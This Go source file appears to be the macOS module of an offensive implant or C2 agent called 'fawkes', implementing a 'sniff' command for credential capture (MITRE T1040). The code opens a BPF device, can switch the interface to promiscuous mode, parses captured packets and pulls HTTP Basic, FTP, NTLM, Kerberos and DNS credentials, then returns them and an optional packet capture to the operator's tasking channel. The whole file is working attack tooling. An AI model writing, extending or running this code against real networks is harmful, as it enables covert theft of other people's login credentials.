//go:build darwin

package commands

import (
	"encoding/binary"
	"encoding/json"
	"fmt"
	"net"
	"strings"
	"time"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/unix"
)

type SniffCommand struct{}

func (c *SniffCommand) Name() string { return "sniff" }
func (c *SniffCommand) Description() string {
	return "Passive network sniffing for credential capture (T1040)"
}

func (c *SniffCommand) Execute(task structs.Task) structs.CommandResult {
	var params sniffParams
	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
		return errorf("Error parsing parameters: %v", err)
	}

	if params.Action == "poison" {
		return c.executePoison(task)
	}

	if params.Duration <= 0 {
		params.Duration = 30
	}
	if params.Duration > 300 {
		params.Duration = 300
	}
	if params.MaxBytes <= 0 {
		params.MaxBytes = 50 * 1024 * 1024
	}

	var ports []uint16
	if params.Ports != "" {
		for _, p := range strings.Split(params.Ports, ",") {
			p = strings.TrimSpace(p)
			var port int
			if _, err := fmt.Sscanf(p, "%d", &port); err == nil && port > 0 && port < 65536 {
				ports = append(ports, uint16(port))
			}
		}
	}
	if len(ports) == 0 {
		ports = []uint16{21, 53, 80, 88, 110, 143, 389, 445, 8080}
	}

	ifaceName := params.Interface
	if ifaceName == "" {
		ifaceName = "en0"
	}

	if _, err := net.InterfaceByName(ifaceName); err != nil {
		return errorf("Interface %q not found: %v", ifaceName, err)
	}

	// Open a BPF device (/dev/bpf0 through /dev/bpf15)
	fd := -1
	for i := 0; i < 16; i++ {
		dev := fmt.Sprintf("/dev/bpf%d", i)
		var openErr error
		fd, openErr = unix.Open(dev, unix.O_RDONLY, 0)
		if openErr == nil {
			break
		}
	}
	if fd < 0 {
		return errorf("Failed to open BPF device (need root): no available /dev/bpfN")
	}
	defer unix.Close(fd)

	// BIOCSETIF — bind to interface
	ifReq := [32]byte{}
	copy(ifReq[:], ifaceName)
	_, _, errno := unix.Syscall(unix.SYS_IOCTL, uintptr(fd), uintptr(0x8020426C), uintptr(unsafe.Pointer(&ifReq[0])))
	if errno != 0 {
		return errorf("BIOCSETIF failed for %q: %v", ifaceName, errno)
	}

	// BIOCIMMEDIATE — deliver packets immediately
	imm := 1
	unix.Syscall(unix.SYS_IOCTL, uintptr(fd), uintptr(0x80044270), uintptr(unsafe.Pointer(&imm)))

	result := &sniffResult{}

	// BIOCPROMISC — promiscuous mode
	if params.Promiscuous {
		_, _, errno = unix.Syscall(unix.SYS_IOCTL, uintptr(fd), uintptr(0x20004269), 0)
		if errno != 0 {
			result.Errors = append(result.Errors, fmt.Sprintf("promiscuous mode failed: %v", errno))
		}
	}

	// BIOCGBLEN — get buffer length
	bufLen := 0
	unix.Syscall(unix.SYS_IOCTL, uintptr(fd), uintptr(0x40044266), uintptr(unsafe.Pointer(&bufLen)))
	if bufLen <= 0 {
		bufLen = 4096
	}

	// BIOCSRTIMEOUT — read timeout
	tv := unix.Timeval{Sec: 1, Usec: 0}
	unix.Syscall(unix.SYS_IOCTL, uintptr(fd), uintptr(0x8010426D), uintptr(unsafe.Pointer(&tv)))

	ftpTracker := &sniffFTPTracker{pending: make(map[string]string)}
	var pcapCollector *sniffPCAPCollector
	if params.SavePCAP {
		pcapCollector = newSniffPCAPCollector(params.MaxBytes)
	}
	deadline := time.Now().Add(time.Duration(params.Duration) * time.Second)
	startTime := time.Now()
	buf := make([]byte, bufLen)

	for !task.DidStop() && time.Now().Before(deadline) && result.BytesCaptured < params.MaxBytes {
		n, readErr := unix.Read(fd, buf)
		if readErr != nil {
			if readErr == unix.EAGAIN || readErr == unix.EWOULDBLOCK || readErr == unix.EINTR {
				continue
			}
			result.Errors = append(result.Errors, fmt.Sprintf("read: %v", readErr))
			break
		}
		if n == 0 {
			continue
		}

		// Parse BPF buffer (may contain multiple packets)
		offset := 0
		for offset < n {
			if offset+18 > n {
				break
			}
			bpfHdrLen := int(binary.LittleEndian.Uint16(buf[offset+16 : offset+18]))
			capLen := int(binary.LittleEndian.Uint32(buf[offset+8 : offset+12]))
			if bpfHdrLen == 0 || capLen == 0 {
				break
			}
			pktStart := offset + bpfHdrLen
			pktEnd := pktStart + capLen
			if pktEnd > n {
				break
			}

			packet := buf[pktStart:pktEnd]
			result.PacketCount++
			result.BytesCaptured += int64(capLen)

			if pcapCollector != nil {
				pcapCollector.addPacket(packet)
			}

			// Parse Ethernet -> IPv4 -> TCP/UDP
			if len(packet) >= 14 {
				etherType := binary.BigEndian.Uint16(packet[12:14])
				if etherType == 0x0800 {
					ipData := packet[14:]
					if len(ipData) >= 20 {
						ihl := int(ipData[0]&0x0F) * 4
						proto := ipData[9]
						if ihl >= 20 && ihl <= len(ipData) && (proto == 6 || proto == 17) {
							totalLen := int(binary.BigEndian.Uint16(ipData[2:4]))
							if totalLen > len(ipData) {
								totalLen = len(ipData)
							}
							meta := packetMeta{
								SrcIP: net.IP(ipData[12:16]).String(),
								DstIP: net.IP(ipData[16:20]).String(),
							}
							transportData := ipData[ihl:totalLen]
							var payload []byte
							if proto == 6 && len(transportData) >= 20 { // TCP
								meta.SrcPort = binary.BigEndian.Uint16(transportData[0:2])
								meta.DstPort = binary.BigEndian.Uint16(transportData[2:4])
								dataOff := int(transportData[12]>>4) * 4
								if dataOff >= 20 && dataOff <= len(transportData) {
									payload = transportData[dataOff:]
								}
							} else if proto == 17 && len(transportData) >= 8 { // UDP
								meta.SrcPort = binary.BigEndian.Uint16(transportData[0:2])
								meta.DstPort = binary.BigEndian.Uint16(transportData[2:4])
								payload = transportData[8:]
							}
							if len(payload) > 0 {
								portMatch := false
								for _, p := range ports {
									if meta.SrcPort == p || meta.DstPort == p {
										portMatch = true
										break
									}
								}
								if portMatch {
									if cred := sniffExtractHTTPBasicAuth(payload, &meta); cred != nil {
										result.Credentials = append(result.Credentials, cred)
									}
									if meta.DstPort == 21 || meta.SrcPort == 21 {
										if cred := ftpTracker.process(payload, &meta); cred != nil {
											result.Credentials = append(result.Credentials, cred)
										}
									}
									if cred := sniffExtractNTLM(payload, &meta); cred != nil {
										result.Credentials = append(result.Credentials, cred)
									}
									if cred := sniffExtractKerberos(payload, &meta); cred != nil {
										result.Credentials = append(result.Credentials, cred)
									}
									if cred := sniffExtractDNS(payload, &meta); cred != nil {
										result.Credentials = append(result.Credentials, cred)
									}
								}
							}
						}
					}
				}
			}

			// BPF word-aligned next packet
			aligned := (capLen + bpfHdrLen + 3) & ^3
			offset += aligned
		}
	}

	result.Duration = time.Since(startTime).Truncate(time.Second).String()

	if pcapCollector != nil && len(pcapCollector.packets) > 0 {
		pcapData := pcapCollector.buildPCAP(1) // LINKTYPE_ETHERNET
		sniffUploadPCAP(&task, pcapData, result)
	}

	output, _ := json.Marshal(result)
	return successResult(string(output))
}
